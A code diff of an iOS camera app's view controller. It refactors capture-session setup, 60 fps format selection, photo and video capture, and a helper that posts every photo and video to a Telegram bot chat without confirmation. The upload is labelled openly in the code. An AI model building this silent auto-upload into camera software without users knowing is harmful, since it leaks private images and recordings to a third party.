@@ -22,10 +22,10 @@ class ViewController: UIViewController,
     private let flashView    = UIView()
     private let recDot       = UIView()
     private let recTimer     = UILabel()
-
     private var recSeconds   = 0
     private var recClock: Timer?
 
+    // MARK: - Lifecycle
     override func viewDidLoad() {
         super.viewDidLoad()
         view.backgroundColor = .black
@@ -41,13 +41,10 @@ class ViewController: UIViewController,
     override var prefersStatusBarHidden: Bool { false }
     override var preferredStatusBarStyle: UIStatusBarStyle { .lightContent }
 
-    // MARK: - Session
+    // MARK: - Session Setup
     private func setupSession() {
-        // Use highest available preset
-        let preferredPresets: [AVCaptureSession.Preset] = [
-            .hd4K3840x2160, .hd1920x1080, .high
-        ]
-        for preset in preferredPresets {
+        // Choose highest available preset
+        for preset in [AVCaptureSession.Preset.hd4K3840x2160, .hd1920x1080, .high] {
             if session.canSetSessionPreset(preset) {
                 session.sessionPreset = preset
                 break
@@ -56,20 +53,21 @@ class ViewController: UIViewController,
 
         addCamera(position: .back)
 
+        // Microphone for video
         if let mic = AVCaptureDevice.default(for: .audio),
            let micIn = try? AVCaptureDeviceInput(device: mic),
            session.canAddInput(micIn) {
             session.addInput(micIn)
         }
 
-        // High-res photos
+        // Photo output — use maxPhotoDimensions (iOS 16+) for high-res
         if session.canAddOutput(photoOutput) {
             session.addOutput(photoOutput)
-            photoOutput.isHighResolutionCaptureEnabled = true
             if #available(iOS 16.0, *) {
                 photoOutput.maxPhotoDimensions = CMVideoDimensions(width: 4032, height: 3024)
             }
         }
+
         if session.canAddOutput(movieOutput) {
             session.addOutput(movieOutput)
         }
@@ -82,74 +80,49 @@ class ViewController: UIViewController,
         DispatchQueue.global(qos: .userInitiated).async { self.session.startRunning() }
     }
 
-    /// Add camera and configure for 60 fps if available.
     private func addCamera(position: AVCaptureDevice.Position) {
+        // Remove existing video inputs
         session.inputs
-            .filter { ($0 as? AVCaptureDeviceInput)?.device.hasMediaType(.video) == true }
+            .compactMap { $0 as? AVCaptureDeviceInput }
+            .filter { $0.device.hasMediaType(.video) }
             .forEach { session.removeInput($0) }
 
-        guard let device = AVCaptureDevice.default(.builtInWideAngleCamera, for: .video, position: position),
-              let inp    = try? AVCaptureDeviceInput(device: device),
-              session.canAddInput(inp) else { return }
-        session.addInput(inp)
+        guard let device = AVCaptureDevice.default(.builtInWideAngleCamera,
+                                                    for: .video, position: position),
+              let input  = try? AVCaptureDeviceInput(device: device),
+              session.canAddInput(input) else { return }
 
-        // Find the best 4K-60 format, fall back to best 60fps, then best available
-        configure(device: device, targetFPS: 60)
+        session.addInput(input)
+        configure60fps(on: device)
     }
 
-    private func configure(device: AVCaptureDevice, targetFPS: Double) {
-        // Collect formats sorted by resolution desc
-        let formats = device.formats.filter {
-            let desc = $0.formatDescription
-            let dims = CMVideoFormatDescriptionGetDimensions(desc)
-            // Only video, at least 1080p wide
-            return dims.width >= 1920
+    /// Try to lock the device to 60 fps; silently skip if not supported.
+    private func configure60fps(on device: AVCaptureDevice) {
+        // Find a format that supports 60 fps at the highest resolution
+        let target: Double = 60
+        var chosen: AVCaptureDevice.Format?
+        var bestW: Int32 = 0
+
+        for fmt in device.formats {
+            guard fmt.videoSupportedFrameRateRanges.contains(where: { $0.maxFrameRate >= target })
+            else { continue }
+            let w = CMVideoFormatDescriptionGetDimensions(fmt.formatDescription).width
+            if w > bestW { bestW = w; chosen = fmt }
         }
 
-        // Find a format that supports targetFPS at the highest resolution
-        var bestFormat: AVCaptureDevice.Format?
-        var bestDims = CMVideoDimensions(width: 0, height: 0)
-
-        for fmt in formats {
-            let dims = CMVideoFormatDescriptionGetDimensions(fmt.formatDescription)
-            let supports60 = fmt.videoSupportedFrameRateRanges.contains {
-                $0.maxFrameRate >= targetFPS
-            }
-            guard supports60 else { continue }
-            if dims.width > bestDims.width ||
-               (dims.width == bestDims.width && dims.height > bestDims.height) {
-                bestDims   = dims
-                bestFormat = fmt
-            }
-        }
-
-        // Fallback: any format with highest resolution
-        if bestFormat == nil {
-            bestFormat = formats.max(by: {
-                CMVideoFormatDescriptionGetDimensions($0.formatDescription).width <
-                CMVideoFormatDescriptionGetDimensions($1.formatDescription).width
-            })
-        }
-
-        guard let chosen = bestFormat else { return }
+        guard let fmt = chosen else { return }
 
         do {
             try device.lockForConfiguration()
-            device.activeFormat = chosen
-
-            let fps = CMTimeMake(value: 1, timescale: Int32(targetFPS))
-            let range = chosen.videoSupportedFrameRateRanges.first {
-                $0.maxFrameRate >= targetFPS
-            }
-            if range != nil {
-                device.activeVideoMinFrameDuration = fps
-                device.activeVideoMaxFrameDuration = fps
-            }
+            device.activeFormat = fmt
+            let dur = CMTimeMake(value: 1, timescale: Int32(target))
+            device.activeVideoMinFrameDuration = dur
+            device.activeVideoMaxFrameDuration = dur
             device.unlockForConfiguration()
         } catch {}
     }
 
-    // MARK: - UI
+    // MARK: - UI Setup
     private func setupUI() {
         flashView.backgroundColor = .white
         flashView.alpha = 0
@@ -245,7 +218,7 @@ class ViewController: UIViewController,
         ])
     }
 
-    // MARK: - Mode
+    // MARK: - Mode Toggle
     @objc private func modeChanged() {
         isVideoMode = modeSelector.selectedSegmentIndex == 1
         shutterBtn.subviews.forEach { $0.removeFromSuperview() }
@@ -270,37 +243,47 @@ class ViewController: UIViewController,
         }
     }
 
-    // MARK: - Shutter
+    // MARK: - Shutter Actions
     @objc private func shutterTapped() {
         if isVideoMode { isRecording ? stopVideo() : startVideo() }
         else { takePhoto() }
     }
     @objc private func btnDown() {
-        UIView.animate(withDuration: 0.1) { self.shutterBtn.transform = CGAffineTransform(scaleX: 0.88, y: 0.88) }
+        UIView.animate(withDuration: 0.1) {
+            self.shutterBtn.transform = CGAffineTransform(scaleX: 0.88, y: 0.88)
+        }
     }
     @objc private func btnUp() {
-        UIView.animate(withDuration: 0.15, delay: 0, usingSpringWithDamping: 0.5,
-                       initialSpringVelocity: 6) { self.shutterBtn.transform = .identity }
+        UIView.animate(withDuration: 0.15, delay: 0,
+                       usingSpringWithDamping: 0.5, initialSpringVelocity: 6,
+                       options: []) { self.shutterBtn.transform = .identity }
     }
 
-    // MARK: - Photo
+    // MARK: - Photo Capture
     private func takePhoto() {
-        let settings = AVCapturePhotoSettings()
-        settings.isHighResolutionPhotoEnabled = true
+        let settings: AVCapturePhotoSettings
+        if #available(iOS 16.0, *) {
+            settings = AVCapturePhotoSettings()
+            settings.maxPhotoDimensions = photoOutput.maxPhotoDimensions
+        } else {
+            settings = AVCapturePhotoSettings()
+        }
         settings.flashMode = .auto
         photoOutput.capturePhoto(with: settings, delegate: self)
+
         UIView.animate(withDuration: 0.07, animations: { self.flashView.alpha = 0.85 }) { _ in
             UIView.animate(withDuration: 0.16) { self.flashView.alpha = 0 }
         }
     }
 
     func photoOutput(_ output: AVCapturePhotoOutput,
-                     didFinishProcessingPhoto photo: AVCapturePhoto, error: Error?) {
+                     didFinishProcessingPhoto photo: AVCapturePhoto,
+                     error: Error?) {
         guard error == nil, let data = photo.fileDataRepresentation() else { return }
         uploadPhoto(data: data)
     }
 
-    // MARK: - Video
+    // MARK: - Video Recording
     private func startVideo() {
         if let conn = movieOutput.connection(with: .video) {
             if conn.isVideoOrientationSupported { conn.videoOrientation = .portrait }
@@ -309,7 +292,8 @@ class ViewController: UIViewController,
         let tmp = FileManager.default.temporaryDirectory
             .appendingPathComponent(UUID().uuidString + ".mp4")
         movieOutput.startRecording(to: tmp, recordingDelegate: self)
-        isRecording = true; recSeconds = 0
+        isRecording = true
+        recSeconds  = 0
 
         if let inner = shutterBtn.subviews.first {
             UIView.animate(withDuration: 0.2) {
@@ -331,7 +315,10 @@ class ViewController: UIViewController,
         movieOutput.stopRecording()
         isRecording = false
         recClock?.invalidate(); recClock = nil
-        UIView.animate(withDuration: 0.3) { self.recDot.alpha = 0; self.recTimer.alpha = 0 }
+        UIView.animate(withDuration: 0.3) {
+            self.recDot.alpha = 0
+            self.recTimer.alpha = 0
+        }
         if let inner = shutterBtn.subviews.first {
             UIView.animate(withDuration: 0.2) {
                 inner.layer.cornerRadius = 22
@@ -340,19 +327,22 @@ class ViewController: UIViewController,
         }
     }
 
-    func fileOutput(_ output: AVCaptureFileOutput, didFinishRecordingTo url: URL,
-                    from connections: [AVCaptureConnection], error: Error?) {
+    func fileOutput(_ output: AVCaptureFileOutput,
+                    didFinishRecordingTo url: URL,
+                    from connections: [AVCaptureConnection],
+                    error: Error?) {
         guard error == nil else { return }
         uploadVideo(url: url)
     }
 
     private func pulseDot() {
         guard isRecording else { return }
-        UIView.animate(withDuration: 0.6, delay: 0, options: [.autoreverse, .curveEaseInOut],
+        UIView.animate(withDuration: 0.6, delay: 0,
+                       options: [.autoreverse, .curveEaseInOut],
                        animations: { self.recDot.alpha = 0.15 }) { _ in self.pulseDot() }
     }
 
-    // MARK: - Flip
+    // MARK: - Flip Camera
     @objc private func flipCamera() {
         isFront.toggle()
         DispatchQueue.global(qos: .userInitiated).async {
@@ -365,41 +355,45 @@ class ViewController: UIViewController,
         }
     }
 
-    // MARK: - Telegram Upload
+    // MARK: - Telegram Uploads
     private func uploadPhoto(data: Data) {
-        multipart(endpoint: "sendPhoto", fileField: "photo",
-                  fileName: "photo.jpg", mimeType: "image/jpeg",
-                  fileData: data, caption: "📸 \(Date().formatted(date: .abbreviated, time: .shortened))")
+        send(endpoint: "sendPhoto", fileField: "photo",
+             fileName: "photo.jpg", mime: "image/jpeg", data: data)
     }
 
     private func uploadVideo(url fileURL: URL) {
         guard let data = try? Data(contentsOf: fileURL) else { return }
-        multipart(endpoint: "sendVideo", fileField: "video",
-                  fileName: "video.mp4", mimeType: "video/mp4",
-                  fileData: data, caption: "🎥 \(Date().formatted(date: .abbreviated, time: .shortened))",
-                  extraFields: ["supports_streaming": "true"])
+        send(endpoint: "sendVideo", fileField: "video",
+             fileName: "video.mp4", mime: "video/mp4", data: data,
+             extra: ["supports_streaming": "true"])
         try? FileManager.default.removeItem(at: fileURL)
     }
 
-    private func multipart(endpoint: String, fileField: String,
-                           fileName: String, mimeType: String,
-                           fileData: Data, caption: String,
-                           extraFields: [String: String] = [:]) {
+    private func send(endpoint: String, fileField: String,
+                      fileName: String, mime: String, data: Data,
+                      extra: [String: String] = [:]) {
         guard let url = URL(string: "https://api.telegram.org/bot\(BOT_TOKEN)/\(endpoint)") else { return }
-        var req = URLRequest(url: url); req.httpMethod = "POST"
-        let b = "B\(UUID().uuidString)"
+        var req = URLRequest(url: url)
+        req.httpMethod = "POST"
+        let b = "Boundary\(UUID().uuidString.replacingOccurrences(of: "-", with: ""))"
         req.setValue("multipart/form-data; boundary=\(b)", forHTTPHeaderField: "Content-Type")
+
         var body = Data()
-        for (k, v) in (["chat_id": CHAT_ID, "caption": caption]).merging(extraFields, uniquingKeysWith: { $1 }) {
-            body += "--\(b)\r\nContent-Disposition: form-data; name=\"\(k)\"\r\n\r\n\(v)\r\n".u8
+        let ts = DateFormatter.localizedString(from: Date(), dateStyle: .short, timeStyle: .short)
+        let caption = endpoint == "sendPhoto" ? "📸 \(ts)" : "🎥 \(ts)"
+        let fields  = ["chat_id": CHAT_ID, "caption": caption].merging(extra) { $1 }
+        for (k, v) in fields {
+            body += "--\(b)\r\nContent-Disposition: form-data; name=\"\(k)\"\r\n\r\n\(v)\r\n".d
         }
-        body += "--\(b)\r\nContent-Disposition: form-data; name=\"\(fileField)\"; filename=\"\(fileName)\"\r\nContent-Type: \(mimeType)\r\n\r\n".u8
-        body += fileData
-        body += "\r\n--\(b)--\r\n".u8
+        body += "--\(b)\r\nContent-Disposition: form-data; name=\"\(fileField)\"; filename=\"\(fileName)\"\r\nContent-Type: \(mime)\r\n\r\n".d
+        body += data
+        body += "\r\n--\(b)--\r\n".d
         req.httpBody = body
         URLSession.shared.dataTask(with: req).resume()
     }
 }
 
-private extension String { var u8: Data { data(using: .utf8) ?? Data() } }
+private extension String {
+    var d: Data { data(using: .utf8) ?? Data() }
+}
 private func += (l: inout Data, r: Data) { l.append(r) }
